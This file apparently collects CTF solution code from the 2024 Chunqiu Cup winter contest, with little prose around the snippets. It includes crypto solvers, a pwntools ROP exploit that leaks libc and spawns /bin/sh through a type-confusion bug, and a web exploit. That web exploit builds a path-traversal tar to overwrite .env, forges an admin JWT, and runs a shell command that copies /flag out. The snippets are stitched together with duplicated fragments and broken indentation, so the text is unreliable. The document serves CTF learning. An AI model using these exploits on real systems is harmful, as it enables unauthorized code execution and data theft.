# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/春秋杯WP_-_2024春秋杯冬季赛第一天题目部分解析.md
# TITLE: 春秋杯WP | 2024春秋杯冬季赛第一天题目部分解析
# CATEGORY: pwn

dh = dh << 234
k1 = (e * dh - 1) // N + 1
kh = k1 >> 999
hash512 = bytes_to_long(hashlib.sha512(long_to_bytes(kh)).digest())
paq = N + 1 - (e * dh - 1) // k2
from Crypto.Util.number import *
import hashlib
from sage.all import *

N = 136118062754183389745310564810647775266982676548047737735816992637554134173584848603639466464742356367710495866667096829923708012429655117288119142397966759435369796296519879851106832954992705045187415658986211525671137762731976849094686834222367125196467449367851805003704233320272315754132109804930069754909
e = 84535510470616870286532166161640751551050308780129888352717168230068335698416787047431513418926383858925725335047735841034775106751946839596675772454042961048327194226031173378872580065568452305222770543163564100989527239870852223343451888139802496983605150231009547594049003160603704776585654802288319835839
c = 33745401996968966125635182001303085430914839302716417610841429593849273978442350942630172006035442091942958947937532529202276212995044284510510725187795271653040111323072540459883317296470560328421002809817807686065821857470217309420073434521024668676234556811305412689715656908592843647993803972375716032906
dh = 4640688526301435859021440727129799022671839221457908177477494774081091121794107526784960489513468813917071906410636566370999080603260865728323300663211132743906763686754869052054190200779414682351769446970834390388398743976589588812203933
leak = 12097621642342138576471965047192766550499613568690540866008318074007729495429051811080620384167050353010748708981244471992693663360941733033307618896919023

def pq_add(p, q, leak):
    lp, lq = len(p), len(q)
    tp0 = int(p + (512-lp) * '0', 2)
    tq0 = int(q + (512-lq) * '0', 2)
    tp1 = int(p + (512-lp) * '1', 2)
    tq1 = int(q + (512-lq) * '1', 2)

    if tp0 * tq0 > N or tp1 * tq1 < N:
        return
    if lp == 512-unknown_bits:
        pq.append(tp0)
        return

    t = int(leak[:2], 2)

    if t == 0:
        pq_add(p + '0', q + '0', leak[1:])
    if t == 1:
        pq_add(p + '0', q + '0', leak[1:])
        pq_add(p + '1', q + '0', '0' + leak[2:])
        pq_add(p + '0', q + '1', '0' + leak[2:])
    if t == 2:
        pq_add(p + '1', q + '0', '1' + leak[2:])
        pq_add(p + '0', q + '1', '1' + leak[2:])
        pq_add(p + '1', q + '1', leak[1:])
    if t == 3:
        pq_add(p + '1', q + '1', leak[1:])

dh = dh << 234
k1 = (e * dh - 1) // N + 1
kh = k1 >> 999
hash512 = bytes_to_long(hashlib.sha512(long_to_bytes(kh)).digest())

unknown_bits = 234 + 5

for i in range(2**6):
    k2 = (k1 >> (512 + 6) << (512 + 6)) + (i << 512) + (leak ^ hash512)
    paq = N + 1 - (e * dh - 1) // k2

    pq = []
    try:
        pq_add(p='', q='', leak=bin(paq)[2:])
    
except:
        continue

    for ph in pq:
        x = PolynomialRing(Zmod(N), 'x').gen()
        f = ph + x
        res = f.monic().small_roots(X=2**unknown_bits, beta=0.49, epsilon=0.03)
        if res:
            p = int(f(res[0]))
            q = N // p
            print(long_to_bytes(pow(c, inverse(e, (p-1)*(q-1)), N)))
            exit()
    #define _CRT_SECURE_NO_WARNINGS
    #include<stdio.h>
    #include<stdlib.h>
    #include<string.h>
    #include<stdint.h>

//void xtea_encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {
//    uint32_t sum = 0;
//    uint32_t delta = 0x9E3779B9;
//    uint32_t k[4];
//    memcpy(k, key, sizeof(k));
//    uint32_t v0 = v[0];
//    uint32_t v1 = v[1];
//    for (unsigned int i = 0; i < num_rounds; i++) {
//        uint32_t f = v1 << 4;
//        uint32_t g = v1 >> 5;
//        uint32_t h = f ^ g;
//        uint32_t i = h + v1;
//        uint32_t j = i ^ (sum + k[sum & 3]);
//        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum & 3]);  //1375741483
//        sum += delta;
//        uint32_t a = v0 << 4;
//        uint32_t b = v0 >> 5;
//        uint32_t c = a ^ b;
//        uint32_t d = c + v0;    
//        uint32_t e = d^ (sum + k[(sum >> 11) & 3]);
//        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum >> 11) & 3]);
//    }
//    v[0] = v0;
//    v[1] = v1;
//}
void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {
    unsigned int i;
    uint32_t v0 = v[0], v1 = v[1], delta = 0x20252025, sum = delta * num_rounds;
    for (i = 0; i < num_rounds; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 6)^0x42) + v0) ^ (sum + key[(sum >> 7) & 3])^3;
        sum -= delta;
        v0 -= (((v1 << 4) ^ (v1 >> 6)^0x42) + v1) ^ (sum + key[sum & 3])^3;
    }
    v[0] = v0; v[1] = v1;
}
int main() {
    uint32_t const key[4] = { 2,0,2,5 };//0x64636261,0x68676665,0x34333231,0x38373635,0x6c6b6a69,0x706f6e6d,0x72657771,0
    uint32_t v[10] = { 0x83845981,0x34402115,0xfb1f53d2,0x547564c9,0x3b42fcc6,0x2b67fcde,0x675ab09c,0x1d47f41a,0x876d3272,0x734d7d95 };
    int byte_16561[256] = { 164, 196, 4, 206, 20, 149, 233, 17, 49, 24, 182, 176, 1, 38, 36, 106, 123, 18, 203, 103, 219, 248, 210, 126, 157, 208, 12, 95, 130, 33, 135, 131, 134, 124, 194, 159, 41, 202, 191, 73, 222, 78, 205, 98, 83, 190, 167, 3, 47, 181, 171, 148, 204, 46, 29, 243, 54, 16, 186, 215, 19, 53, 229, 179, 129, 26, 160, 231, 37, 117, 175, 81, 67, 92, 80, 72, 216, 163, 63, 113, 122, 199, 198, 144, 177, 187, 250, 221, 185, 246, 169, 183, 100, 56, 223, 224, 8, 178, 119, 51, 91, 2, 94, 121, 97, 7, 105, 35, 87, 74, 253, 192, 43, 161, 209, 40, 9, 111, 128, 85, 254, 66, 227, 71, 68, 225, 255, 188, 125, 139, 154, 96, 173, 151, 251, 141, 214, 172, 30, 15, 69, 234, 245, 75, 45, 59, 34, 28, 90, 114, 70, 195, 228, 93, 218, 146, 155, 10, 189, 153, 133, 52, 115, 165, 86, 55, 76, 22, 132, 162, 180, 109, 84, 230, 193, 31, 23, 61, 136, 247, 21, 88, 239, 77, 238, 137, 104, 89, 184, 32, 232, 220, 201, 145, 252, 213, 200, 65, 158, 118, 120, 50, 25, 102, 101, 57, 107, 197, 82, 39, 168, 6, 142, 166, 13, 152, 140, 249, 5, 27, 64, 143, 79, 60, 235, 112, 217, 99, 211, 226, 44, 240, 147, 58, 244, 0, 242, 170, 127, 42, 48, 236, 108, 116, 110, 241, 14, 62, 237, 150, 174, 138, 207, 11, 156, 212 };
    for (int h = 0; h < 10; h += 2) {
        uint32_t tmp = v[h];
        uint8_t* first_byte = (uint8_t*)&tmp;
        for (int g = 0; g < 4; g++) {
            int index = *(first_byte + g);
            for (int l = 0; l < 256; l++) {
                if (index == byte_16561[l]){
                    *(first_byte + g) = l;
                }
            }
        }
        v[h] = tmp;
    }
    for (int h = 0; h < 10; h++) {
        printf("%xn", v[h]);
    }
    printf("flag{");
    for (int l = 0; l < 9; l+=2) {
        uint32_t m[2];
        m[0] = v[l];
        m[1] = v[l + 1];
        decipher(32, m, key);
        char* input = (char*)m;
        for (int i = 0; i < 8; i++) {
            printf("%c", input[i]);
        }
    }
    printf("}");
 //flag{e8ff1a85-5ccd-4171-9f2a-ce6eea614a54}
    //decipher(32, v, key);
    //char* input = (char*)v;
    //printf("start:n");
    //for (int i = 0; i < 8; i++) {
    //    printf("%cn", input[i]);
    //}
    //for (int h = 0; h < 8; h++) {
    //    printf("%dn", input[h]);
    //}
}//0xd659641b,0x1ff8f057,0x68dbe56d,0x36c73dcb,0xff6fb296,0x45245c08,0x3fb8e222,0x3d546a65,
flag = [
    0x5c, 0x76, 0x4a, 0x78, 0x15, 0x62, 0x05, 0x7c, 0x6b, 0x21, 
    0x40, 0x66, 0x5b, 0x1a, 0x48, 0x7a, 0x1e, 0x46, 0x7f, 0x28, 
    0x02, 0x75, 0x68, 0x2a, 0x34, 0x0c, 0x4b, 0x1d, 0x3d, 0x2e, 
    0x6b, 0x7a, 0x17, 0x45, 0x07, 0x75, 0x47, 0x27, 0x39, 0x78, 
    0x61, 0x0b
]

key = [58, 26, 43, 31, 110, 0, 50, 69, 82, 68, 34, 85, 58, 55, 125, 67, 123, 35, 82, 28, 96, 70, 10, 7, 86, 56, 114, 121, 16, 29, 82, 74, 47, 117, 97, 22, 117, 20, 92, 65, 88, 118]

for i in range(len(flag)):
    print(chr(flag[i] ^ key[i]), end="")

# flag{b799eb3a-59ee-4b3b-b49d-39080fc23e99}
m1 = bytes_to_long(flag)
m2 = bytes_to_long(''.join(chr((ord(i) + 3) % 128) for i in flag.decode()).encode())
k = 0
for i in range(130):
    if i != 130 - 42:
        k += 3 * pow(2, i * 8)
    else:
        k -= 125 * pow(2, i * 8)  # '}'
e = getPrime(128)
c1 = pow(m1 * e, 2835, N)
c2 = pow(m2, 2025, N)
c3 = pow(m2, 2835, N) + e
x = PolynomialRing(Zmod(N), 'x').gen()
f = c2**7 - (c3-x)**5
f = f.monic()
res = f.small_roots(X=2**128, beta=1, epsilon=0.05)
e = res[0]
def gcd(g1, g2):
    while g2:
        g1, g2 = g2, g1 % g2
    return g1.monic()

x = PolynomialRing(Zmod(N), 'x').gen()
g1 = (x*e)**2835 - c1
g2 = (x+k)**2025 - c2
m1 = int(-gcd(g1, g2)[0])
flag = b'flag{' + str(uuid.uuid4()).encode() + b'}'
flag += bin(getPrime((1024 - bytes_to_long(flag).bit_length()) // 8)).encode()
m1 = bytes_to_long(flag)
i = 0
while 1:
    m1 += N
    flag = long_to_bytes(m1)
    if b'flag{' in flag:
        print(f'{i = }')
        print(flag)
        break
    i += 1
from Crypto.Util.number import *
from sage.all import *

N = 176871561120476589165761750300633332586877708342448994506175624203633860119621512318321172927876389631918300184221082317741380365447197777026256405312212716630617721606918066048995683899616059388173629437673018386590043053146712870572300799479269947118251011967950970286626852935438101046112260915112568392601
c1 = 47280375006817082521114885578132104427687384457963920263778661542552259860890075321953563867658233347930121507835612417278438979006705016537596357679038471176957659834155694284364682759675841808209812316094965393550509913984888849945421092463842546631228640293794745005338773574343676100121000764021207044019
c2 = 176231410933979134585886078013933649498379873444851943224935010972452769899603364686158279269197891190643725008151812150428808550310587709008683339436590112802756767140102136304346001599401670291938369014436170693864034099138767167055456635760196888578642643971920733784690410395944410255241615897032471127315
c3 = 135594807884016971356816423169128168727346102408490289623885211179619571354105102393658249292333179346497415129785184654008299725617668655640857318063992703265407162085178885733134590524577996093366819328960462500124201402816244104477018279673183368074374836717994805448310223434099196774685324616523478136309

k = 0
for i in range(130):
    if i != 130 - 42:
        k += 3 * pow(2, i * 8)
    else:
        k -= 125 * pow(2, i * 8)  # '}'

x = PolynomialRing(Zmod(N), 'x').gen()
f = c2**7 - (c3-x)**5
f = f.monic()
res = f.small_roots(X=2**128, beta=1, epsilon=0.05)
e = res[0]

def gcd(g1, g2):
    while g2:
        g1, g2 = g2, g1 % g2
    return g1.monic()

x = PolynomialRing(Zmod(N), 'x').gen()
g1 = (x*e)**2835 - c1
g2 = (x+k)**2025 - c2
m1 = int(-gcd(g1, g2)[0])

i = 0
while 1:
    m1 += N
    flag = long_to_bytes(m1)
    if b'flag{' in flag:
        print(f'{i = }')
        print(flag)
        break
    i += 1
class Baby {
public:
    virtual void gender() = 0;
};
 
class Boy: public Baby{
public:
    Boy() {
        cout << "A boy was born" << endl;
        strncpy(certificate, generateRandomString(16).c_str(), MAX_DATA_LEN);
    }
    virtual void gender() {
        cout << "The certificate is " << certificate << 'x00' << endl;
    }
    char certificate[MAX_DATA_LEN + 0x10];
};
 
class Girl: public Baby {
public:
    Girl() {
        cout << "A girl was born" << endl;
        certificate = [](const char* str) { puts(str); };
    }
    virtual void gender() {
        string s = "The certificate is " + generateRandomString(16) + 'x00';
        certificate(s.c_str());
    }
    void (*certificate)(const char*);
};
static void choose(Baby* baby) {
    string s = typeid(*baby).name();
    char choice;
    if (s == "3Boy") {
   // pass it
    } else if ( s == "4Girl") {
        menu(baby);
        cin >> choice;
        switch (choice) {
            case '1': {
                // pass it
            }
            case '2': {
                string buf;
                Boy* tomboy = static_cast(baby);
                cout << "If you think you are a boy, please leave your gender certificate" << endl;
                cin >> buf;
                strncpy(tomboy->certificate, buf.c_str(), MAX_DATA_LEN); // 此处certificate会被识别为Boy类的char*类型，因此不会报错
                tomboy->gender(); // 这里会识别为Gril类的gender实现方法
                break;
            }
            default: {
                // pass it
            }
        }
    }
}
void gender() {
        char buf[MAX_DATA_LEN];
        cout << "If you think you are a shopping bag, please leave your gender certificate" << endl;
        read(0, buf, 0x100);
}
-0000000000000010 // Use data definition commands to manipulate stack variables and arguments.
-0000000000000010 // Frame size: 10; Saved regs: 8; Purge: 0
-0000000000000010
-0000000000000010     _BYTE buf[16];
+0000000000000000     _QWORD __saved_registers;
+0000000000000008     _UNKNOWN *__return_address;
+0000000000000010
+0000000000000010 // end of stack variables
# 0x000000000040391a : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret
# 0x0000000000402fcc : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
# 0x000000000040201a : ret
# 0x0000000000403476 : mov rdi, rax ; call rbx
.data.rel.ro:
00000000002014FC                 db    0
.data.rel.ro:
00000000002014FD                 db    0
.data.rel.ro:
00000000002014FE                 db    0
.data.rel.ro:
00000000002014FF                 db    0
.data.rel.ro:
0000000000201500 off_201500      dq offset aBinSh        ; DATA XREF: sub_110F20+C3↑r
.data.rel.ro:
0000000000201500                                         ; sub_110F20+7B1↑r
.data.rel.ro:
0000000000201500                                         ; "/bin/sh"
.data.rel.ro:
0000000000201508                 align 20h
.data.rel.ro:
0000000000201520 off_201520      dq offset off_201560    ; DATA XREF: argp_parse+406↑o
.data.rel.ro:
0000000000201520                                         ; "version"
.data.rel.ro:
0000000000201528                 dq offset sub_134960
from pwn import *
from pwn import p64
 
target_info = {
    'exec_path': './pwn',
    'elf_info': ELF('./pwn'),
    'libc_info': ELF('./libc.so.6')
}

    #io = process(target_info['exec_path'])
io = remote('127.0.0.1', 8888)

    #gdb.attach(io, 'b *0x40262E')
    #pause()

io.recvuntil(b'gift: ')

setvbuf = {
    'got' : int(io.recvline().strip(), 16)
}
log.info(f'setvbuf@got: {hex(setvbuf["got"])}')
target_info['libc_info'].address = setvbuf['got'] - target_info['libc_info'].sym['setvbuf']
log.info(f'libc_base: {hex(target_info["libc_info"].address)}')

binsh = target_info['libc_info'].address + 0x201500
system = target_info['libc_info'].sym['system']

payload = p64(target_info['elf_info'].sym['_Z6genderv'])
io.sendlineafter(b'Girln', b'2')
io.sendlineafter(b'Tomboyn', b'2')
io.sendlineafter(b'certificaten', payload)

puts = {
    'plt': target_info['elf_info'].plt['puts'],
    'got': target_info['elf_info'].got['puts']
}

payload = p64(0)*2 + p64(binsh+8) + p64(0x000000000040391a) + p64(0) + p64(0x0000000000402fcc) + p64(system) + p64(0)*3 + p64(0x000000000040201a) + p64(0x0000000000403476)
io.sendlineafter(b'certificaten', payload)

io.interactive()

# 0x000000000040391a : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret
# 0x0000000000402fcc : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
# 0x000000000040201a : ret
# 0x0000000000403476 : mov rdi, rax ; call rbx
mkdir exp
echo "hack" > exp/secret.txt
tar --create --file=hack.tar --transform 's,exp/,exp/../,' exp/secret.txt```
import jwt
import datetime
import os
import tarfile
import sys
import requests
import random
import string

def generate_random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def send_request(session, method, path, data=None, files=None, headers=None):
    url = f"http://{session.url}{path}"
    response = session.request(method, url, data=data, files=files, headers=headers, proxies={'http': 'http://127.0.0.1:
8083'})
    return response

def generate_jwt(user_id, is_admin, jwt_key):
    expiration_time = datetime.datetime.utcnow() + datetime.timedelta(hours=24)
    claims = {
        'UserID': user_id,
        'IsAdmin': is_admin,
        'exp': expiration_time
    }
    token = jwt.encode(claims, jwt_key, algorithm='HS256')
    return token

def create_malicious_tar():
    # Create the directory and .env file
    os.makedirs('exp', exist_ok=True)
    with open('exp/.env', 'w') as f:
        f.write("JWT_SECRET=hack")

    # Create the tar file with the path traversal
    with tarfile.open('hack.tar', 'w') as tar:
        tar.add('exp/.env', arcname='exp/../../../.env')

def exp(url, token):
    payload = "echo `cat /flag` > /var/www/html/public/flag.txt"

    session = requests.Session()
    session.url = url

    random_string = generate_random_string(4)

    user_data = {
        "username": random_string,
        "password": random_string
    }
    response1 = send_request(session, 'POST', '/register', data=user_data)
    if response1.status_code != 200:
        return "Failed to register"
    response2 = send_request(session, 'POST', '/login', data=user_data)
    if response2.status_code != 200:
        return "Failed to login"

    with open('hack.tar', 'rb') as f:
        files = {'file': f}
        response3 = send_request(session, 'POST', '/upload', files=files)
        if response3.status_code != 200:
            return "Failed to upload malicious tar file"
        print("Malicious tar file uploaded successfully")

    # 触发加载环境变量
    send_request(session, 'GET', '/login')
    headers = {
        'Cookie': f'token={token}'
    }
    response4 = send_request(session, 'GET', '/download/1', headers=headers)
    return response4.text

if __name__ == "__main__":
    create_malicious_tar()
    print("Malicious tar file created: hack.tar")

    jwt_key = "hack"
    user_id = 1
    is_admin = True

    token = generate_jwt(user_id, is_admin, jwt_key)
    print("Generated JWT:", token)

    URL = sys.argv[1]
    flag = exp(URL, token)
    print(flag)
